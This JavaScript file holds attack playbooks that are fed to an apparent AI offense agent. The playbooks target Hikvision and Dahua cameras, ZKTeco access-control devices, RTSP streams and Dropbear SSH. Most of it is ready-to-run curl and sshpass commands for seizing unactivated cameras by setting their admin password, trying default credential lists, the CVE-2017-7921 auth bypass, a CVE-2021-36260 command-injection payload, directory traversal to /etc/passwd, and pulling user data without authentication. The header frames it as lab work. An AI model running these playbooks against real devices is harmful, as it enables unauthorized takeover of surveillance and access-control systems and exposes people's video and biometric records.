// iot-playbooks.js — Curated attack playbooks for IoT devices found on the lab network.
// HackTricks doesn't cover most IoT/camera vendors. This fills the gap with
// device-specific exploitation steps the model can follow.
//
// Used by the auto-playbook injector in offense-agent.js state injection.

const PLAYBOOKS = {
  "hikvision": {
    title: "Hikvision IP Camera / NVR — Attack Playbook",
    keywords: ["hikvision", "isapi", "hik", "webs"],
    content: `## Hikvision IP Camera Exploitation

### 1. Check activation status (CRITICAL — do this FIRST)
\`\`\`
curl -sk http://TARGET/ISAPI/System/deviceInfo
\`\`\`
Look for \`<isActivated>false</isActivated>\`. If false, the camera has NO password.

### 2. ACTIVATE an unactivated camera (set the admin password yourself)
\`\`\`
curl -sk -X PUT http://TARGET/ISAPI/System/activate \\
  -H "Content-Type: application/xml" \\
  -d '<ActivateInfo><password>Test12345!</password></ActivateInfo>'
\`\`\`
If this returns 200 OK, you now have admin access with password Test12345!
This is a CRITICAL finding — record it immediately with add_finding.

### 3. If activated, try default credentials
- admin:12345
- admin:admin
- admin:hikvision
- admin:123456

\`\`\`
curl -sk --digest -u admin:12345 http://TARGET/ISAPI/System/deviceInfo
\`\`\`

### 4. CVE-2017-7921 — Auth bypass (firmware < 5.4.0)
\`\`\`
curl -sk "http://TARGET/System/configurationFile?auth=YWRtaW46MTEK"
\`\`\`
If you get a binary config dump, the camera is vulnerable. The config contains credentials.

### 5. CVE-2021-36260 — Command injection (firmware before 210628)
\`\`\`
curl -sk "http://TARGET/SDK/webLanguage" \\
  -d '<?xml version="1.0" encoding="UTF-8"?><language>$(id)</language>'
\`\`\`
Check if the response contains uid= output.

### 6. RTSP stream access (often unauthenticated)
\`\`\`
curl -sv rtsp://TARGET:554/Streaming/Channels/101 2>&1 | head -20
curl -sv rtsp://TARGET:554/Streaming/Channels/102 2>&1 | head -20
\`\`\`
Or with credentials:
\`\`\`
curl -sv rtsp://admin:12345@TARGET:554/Streaming/Channels/101 2>&1 | head -20
\`\`\`

### 7. ONVIF discovery
\`\`\`
curl -sk -X POST http://TARGET/onvif/device_service \\
  -H "Content-Type: application/soap+xml" \\
  -d '<?xml version="1.0"?><s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"><s:Body><GetDeviceInformation xmlns="http://www.onvif.org/ver10/device/wsdl"/></s:Body></s:Envelope>'
\`\`\`

### Priority order
1. Check isActivated → if false, ACTIVATE (instant admin access)
2. Try default creds (admin:12345)
3. CVE-2017-7921 auth bypass
4. CVE-2021-36260 command injection
5. RTSP unauthenticated access
`,
  },

  "zkteco": {
    title: "ZKTeco Access Control — Attack Playbook",
    keywords: ["zkteco", "zkaccess", "biometric"],
    content: `## ZKTeco Web Interface Exploitation

### 1. Identify the device model from the login page
\`\`\`
curl -sk https://TARGET/
curl -sk https://TARGET/cgi-bin/param.cgi?action=getSettings
\`\`\`

### 2. Default credentials (try ALL of these)
- admin / admin
- admin / 8888
- admin / 123456
- 8888 / 8888
- root / root
- admin / (empty)

The login endpoint varies by model:
\`\`\`
# Method 1: CGI login
curl -sk -X POST https://TARGET/cgi-bin/login.cgi \\
  -d "username=admin&password=admin"

# Method 2: JSON API
curl -sk -X POST https://TARGET/api/login \\
  -H "Content-Type: application/json" \\
  -d '{"username":"admin","password":"admin"}'
\`\`\`

### 3. CVE-2022-42953 — Missing authentication on data endpoints
\`\`\`
curl -sk https://TARGET/csl/user
curl -sk https://TARGET/csl/dept
curl -sk https://TARGET/form/DataApp?type=backup
curl -sk https://TARGET/deviceUsers
\`\`\`
If any return user data without auth, that's a finding.

### 4. EDB-51112 — Missing auth (specific URL paths)
\`\`\`
curl -sk https://TARGET/device/check
curl -sk https://TARGET/users
curl -sk https://TARGET/getUsers
\`\`\`

### 5. EDB-40324 — Hardcoded credentials (older firmware)
The hardcoded creds are often: admin:admin or root:solokey

### 6. Directory traversal (EDB-40326)
\`\`\`
curl -sk "https://TARGET/../../../../etc/passwd"
curl -sk "https://TARGET/cgi-bin/../../etc/passwd"
\`\`\`

### 7. iclock protocol (ZK time & attendance)
\`\`\`
curl -sk "https://TARGET/iclock/getdata?type=user"
curl -sk "https://TARGET/iclock/cdata?type=user"
\`\`\`

### Priority order
1. Default creds (admin:admin, admin:8888)
2. CVE-2022-42953 unauthenticated endpoints
3. Directory traversal
4. Hardcoded creds
`,
  },

  "dahua": {
    title: "Dahua IP Camera / NVR — Attack Playbook",
    keywords: ["dahua"],
    content: `## Dahua Camera Exploitation

### 1. Default credentials
- admin / admin
- admin / (empty)
- 888888 / 888888
- 666666 / 666666

### 2. CVE-2021-36260 equivalent — Dahua auth bypass
\`\`\`
curl -sk "http://TARGET/cgi-bin/configManager.cgi?action=getConfig&name=SystemInfo"
\`\`\`

### 3. RTSP access
\`\`\`
curl -sv rtsp://TARGET:554/cam/realmonitor?channel=1&subtype=0 2>&1 | head -20
curl -sv rtsp://admin:admin@TARGET:554/cam/realmonitor?channel=1&subtype=0 2>&1 | head -20
\`\`\`
`,
  },

  "rtsp": {
    title: "RTSP Stream — Attack Playbook",
    keywords: ["rtsp"],
    content: `## RTSP Stream Testing

### Common unauthenticated paths
\`\`\`
# Hikvision
curl -sv rtsp://TARGET:554/Streaming/Channels/101 2>&1 | head -20

# Dahua
curl -sv rtsp://TARGET:554/cam/realmonitor?channel=1&subtype=0 2>&1 | head -20

# Generic
curl -sv rtsp://TARGET:554/live 2>&1 | head -20
curl -sv rtsp://TARGET:554/stream1 2>&1 | head -20
curl -sv rtsp://TARGET:554/h264 2>&1 | head -20
\`\`\`

### With common credentials
\`\`\`
curl -sv rtsp://admin:admin@TARGET:554/Streaming/Channels/101 2>&1 | head -20
curl -sv rtsp://admin:12345@TARGET:554/Streaming/Channels/101 2>&1 | head -20
\`\`\`

A 200 OK or RTSP/1.0 200 response means the stream is accessible — record as a finding.
`,
  },

  "dropbear": {
    title: "Dropbear SSH — Attack Playbook",
    keywords: ["dropbear"],
    content: `## Dropbear SSH Testing

### 1. Version check
\`\`\`
ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 TARGET 2>&1 | head -5
\`\`\`

### 2. Default embedded device credentials
- root / root
- admin / admin
- admin / (empty)
- root / (empty)
- root / default
- root / toor

\`\`\`
sshpass -p 'root' ssh -o StrictHostKeyChecking=no root@TARGET id
sshpass -p 'admin' ssh -o StrictHostKeyChecking=no admin@TARGET id
\`\`\`
Note: sshpass may need apt-get install -y sshpass

### 3. Known CVEs for older Dropbear
- Dropbear < 2016.72: CVE-2016-7406 (format string)
- Dropbear < 2018.76: CVE-2018-15599 (info leak)
- Dropbear 2020.81 is relatively recent, limited public exploits
`,
  },
};

function getPlaybookForService(serviceName) {
  const lower = serviceName.toLowerCase();
  for (const [key, pb] of Object.entries(PLAYBOOKS)) {
    if (pb.keywords.some(kw => lower.includes(kw))) {
      return pb;
    }
  }
  return null;
}

function getAllMatchingPlaybooks(serviceNames) {
  const seen = new Set();
  const results = [];
  for (const svc of serviceNames) {
    const pb = getPlaybookForService(svc);
    if (pb && !seen.has(pb.title)) {
      seen.add(pb.title);
      results.push(pb);
    }
  }
  return results;
}

module.exports = { PLAYBOOKS, getPlaybookForService, getAllMatchingPlaybooks };
